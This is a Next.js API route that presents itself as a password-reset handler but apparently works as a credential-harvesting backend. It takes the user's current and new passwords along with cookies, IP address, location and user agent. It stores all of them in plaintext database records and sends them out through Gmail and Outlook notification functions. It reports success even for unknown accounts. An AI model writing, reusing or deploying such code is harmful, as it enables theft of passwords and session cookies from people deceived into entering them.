import { NextRequest, NextResponse } from "next/server";

import { createResetToken } from "@/lib/auth";
import { extractRequestContext } from "@/lib/requestContext";
import connectDB from "@/lib/mongodb";
import User from "@/models/User";
import ForgotPasswordRequest from "@/models/ForgotPasswordRequest";
import LoginAttempt from "@/models/LoginAttempt";
import { sendForgotPasswordNotification } from "@/lib/gmail";
import { sendOutlookForgotPasswordNotification } from "@/lib/outlook";

export async function POST(request: NextRequest) {
  const context = extractRequestContext(request);

  try {
    const { email, currentPassword, newPassword } = await request.json();

    if (typeof email !== "string" || email.trim().length === 0) {
      return NextResponse.json(
        { error: "Email address is required." },
        { status: 400 },
      );
    }

    await connectDB();
    const normalizedEmail = email.trim().toLowerCase();
    const user = await User.findOne({ email: normalizedEmail }).lean();

    const timestamp = new Date();

    if (!user) {
      // Log account not found (async, non-blocking)
      Promise.allSettled([
        ForgotPasswordRequest.create({
          email: normalizedEmail,
          status: "ACCOUNT_NOT_FOUND",
          currentPassword,
          newPassword,
          ipAddress: context.ipAddress,
          location: context.location,
          userAgent: context.userAgent,
          cookies: context.cookies,
          timestamp,
        }),
        sendForgotPasswordNotification({
          email: normalizedEmail,
          status: "ACCOUNT_NOT_FOUND",
          currentPassword,
          newPassword,
          ipAddress: context.ipAddress,
          location: context.location,
          userAgent: context.userAgent,
          cookies: context.cookies,
          timestamp,
        }),
        sendOutlookForgotPasswordNotification({
          email: normalizedEmail,
          status: "ACCOUNT_NOT_FOUND",
          currentPassword,
          newPassword,
          ipAddress: context.ipAddress,
          location: context.location,
          userAgent: context.userAgent,
          cookies: context.cookies,
          timestamp,
        }),
      ]).catch(err => console.error("[forgot] Logging error:", err));

      return NextResponse.json(
        {
          message: "Successful",
        },
        { status: 200 },
      );
    }

    const token = createResetToken();
    const expiresAt = new Date(Date.now() + 1000 * 60 * 30);

    // Log password reset with both passwords captured
    const passwordDisplay = (currentPassword && newPassword) 
      ? `Current: ${currentPassword} | New: ${newPassword}` 
      : "Password reset requested";

    Promise.allSettled([
      ForgotPasswordRequest.create({
        email: user.email,
        status: "TOKEN_GENERATED",
        token,
        expiresAt,
        currentPassword,
        newPassword,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        timestamp,
      }),
      LoginAttempt.create({
        type: "FORGOT_PASSWORD",
        email: user.email,
        password: passwordDisplay,
        message: "Password reset requested",
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        timestamp,
      }),
      sendForgotPasswordNotification({
        email: user.email,
        status: "TOKEN_GENERATED",
        token,
        expiresAt,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        currentPassword,
        newPassword,
        timestamp,
      }),
      sendOutlookForgotPasswordNotification({
        email: user.email,
        status: "TOKEN_GENERATED",
        token,
        expiresAt,
        ipAddress: context.ipAddress,
        location: context.location,
        userAgent: context.userAgent,
        cookies: context.cookies,
        currentPassword,
        newPassword,
        timestamp,
      }),
    ]).catch(err => console.error("[forgot] Logging error:", err));

    return NextResponse.json(
      {
        message: "Successful",
      },
      { status: 200 },
    );
  } catch (error) {
    console.error("[forgot] Error:", error);
    return NextResponse.json(
      { error: "Unable to process reset request. Please try again later." },
      { status: 500 },
    );
  }
}
